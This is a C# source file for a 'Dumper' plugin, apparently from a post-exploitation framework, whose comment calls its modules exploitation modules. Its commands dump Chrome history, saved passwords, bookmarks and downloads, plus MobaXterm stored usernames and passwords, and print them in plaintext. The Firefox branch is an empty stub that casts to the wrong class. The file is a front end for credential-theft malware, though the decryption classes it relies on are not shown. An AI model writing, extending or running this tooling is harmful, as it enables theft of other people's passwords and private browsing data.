using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Plugin.Abstractions48;

namespace Plugin48Dumper
{
    public class PluginDumper : IPlugin
    {
        private IPluginContext _ctx;
        private DataTable _table;

        public string Name => "Dumper";
        public Version Version => new Version(1, 0, 0);
        public PluginAttribute Attribute { get; set; }

        public DataTable HelpTable => _table;

        private List<clsDumper> m_lsModule = new List<clsDumper>()
        {
            new clsChromeDumper(),
            new clsMobaXtermDumper(),
        };
        private Dictionary<string, clsDumper> m_dicModule = new Dictionary<string, clsDumper>();

        public void Init(IPluginContext context)
        {
            _ctx = context;
            _ctx.Log("Plugin Init");

            Attribute = new PluginAttribute()
            {
                Author = "ISSAC",
                Description = "A tool for dumping information.",
                Usage = "dumper target=<Target> <Option>",
            };

            _table = new DataTable();
            _table.Columns.Add("Command");
            _table.Columns.Add("Description");

            _table.Rows.Add("ls", "Print available modules.");
            _table.Rows.Add("dump", "Dump target.");

            //Load exploitation module
            foreach (var module in m_lsModule)
            {
                if (module.Available)
                {
                    m_dicModule.Add(module.Entry, module);
                }
            }
        }

        public object Execute(IDictionary<string, object> args)
        {
            List<string> lsKey = args.Keys.ToList();
            string szCmd = lsKey[0];

            if (szCmd == "ls")
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("Module");
                dt.Columns.Add("Description");

                foreach (string szKey in m_dicModule.Keys)
                {
                    dt.Rows.Add(szKey, m_dicModule[szKey].Description);
                }

                clsTools.fnPrintTable(dt);
            }
            else if (szCmd == "dump")
            {
                object objTarget;
                object objCount;
                object objRegex;

                string szTarget = string.Empty;
                int nCount = 100;
                string szRegex = string.Empty;

                args.TryGetValue("target", out objTarget);
                if (objTarget == null)
                    throw new Exception("Cannot find target.");

                szTarget = (string)objTarget;
                if (!m_dicModule.ContainsKey(szTarget))
                    throw new Exception("Unavailable module: " + szTarget);

                args.TryGetValue("count", out objCount);
                if (objCount != null)
                    nCount = int.Parse((string)objCount);

                args.TryGetValue("regex", out objRegex);
                if (objRegex != null)
                    szRegex = (string)objRegex;
                
                if (szTarget == "chrome")
                {
                    var module = (clsChromeDumper)m_dicModule[szTarget];
                    string szAction = lsKey[2];

                    clsTools.fnLogInfo("Action => " + szAction);

                    if (szAction == "history")
                    {
                        var ls = module.fnlsDumpHistory(nCount, szRegex);
                        foreach (var history in ls)
                        {
                            clsTools.fnLogOK(new string('=', 50));

                            clsTools.fnLogOK($"[Title]: {history.Title}");
                            clsTools.fnLogOK($"[URL]: {history.URL}");
                            clsTools.fnLogOK($"[Last Used]: {history.szLastUsed}");
                        }

                        clsTools.fnLogOK(new string('=', 50));
                        clsTools.fnLogOK("[Summary]");
                        clsTools.fnLogOK($"Total: {ls.Count} records");
                    }
                    else if (szAction == "cred")
                    {
                        var ls = module.fnlsDumpCredential(nCount, szRegex);
                        foreach (var cred in ls)
                        {
                            clsTools.fnLogOK(new string('=', 50));

                            clsTools.fnLogOK("[URL]: " + cred.URL);
                            clsTools.fnLogOK("[Password]: " + cred.Password);
                            clsTools.fnLogOK("[Creation Date]: " + cred.szCreationDate);
                            clsTools.fnLogOK("[Last Used]: " + cred.szLastUsed);
                        }

                        clsTools.fnLogOK(new string('=', 50));
                        clsTools.fnLogOK("[Summary]");
                        clsTools.fnLogOK($"Total: {ls.Count} records");
                    }
                    else if (szAction == "bookmark")
                    {
                        var ls = module.fnlsDumpBookMark(nCount);
                        foreach (var bookMark in ls)
                        {
                            clsTools.fnLogOK(new string('=', 50));

                            clsTools.fnLogOK("[Name]: " + bookMark.Name);
                            clsTools.fnLogOK("[URL]: " + bookMark.URL);
                            clsTools.fnLogOK("[Added Date]: " + bookMark.szAddDate);
                            clsTools.fnLogOK("[Last Used Date]: " + bookMark.szLastUsed);
                            clsTools.fnLogOK("[Path]: " + bookMark.Path);
                        }

                        clsTools.fnLogOK(new string('=', 50));
                        clsTools.fnLogOK("[Summary]");
                        clsTools.fnLogOK($"Total: {ls.Count} records");
                    }
                    else if (szAction == "download")
                    {
                        var ls = module.fnlsDumpDownload(nCount, szRegex);
                        foreach (var download in ls)
                        {
                            clsTools.fnLogOK(new string('=', 50));

                            clsTools.fnLogOK("[URL]: " + download.URL);
                            clsTools.fnLogOK("[FilePath]: " + download.FileName);
                            clsTools.fnLogOK("[FileName]: " + Path.GetFileName(download.FileName));
                            clsTools.fnLogOK("[Length]: " + download.Length.ToString() + " bytes");
                            clsTools.fnLogOK("[Date]: " + download.szDate);
                        }

                        clsTools.fnLogOK(new string('=', 50));
                        clsTools.fnLogOK("[Summary]");
                        clsTools.fnLogOK($"Total: {ls.Count} records");
                    }
                    else
                    {
                        clsTools.fnLogError("Invalid action: " + szAction);
                    }
                }
                else if (szTarget == "firefox")
                {
                    var module = (clsChromeDumper)m_dicModule[szTarget];
                    string szAction = lsKey[2];

                    clsTools.fnLogInfo("Action => " + szAction);

                    if (szAction == "cred")
                    {

                    }
                }
                else if (szTarget == "xterm")
                {
                    var xterm = new clsMobaXtermDumper();
                    var ls = xterm.fnlsDump();

                    foreach (var cred in ls)
                    {
                        clsTools.fnLogInfo(new string('-', 50));

                        clsTools.fnLogInfo(cred.Username);
                        clsTools.fnLogInfo(cred.Password);
                    }

                    clsTools.fnLogInfo(new string('-', 50));
                }
            }
            else
            {
                throw new Exception("Unknown command: " + szCmd);
            }

            return string.Empty;
        }

        public void Dispose()
        {
            _ctx.Log("Plugin Dispose");
        }
    }
}
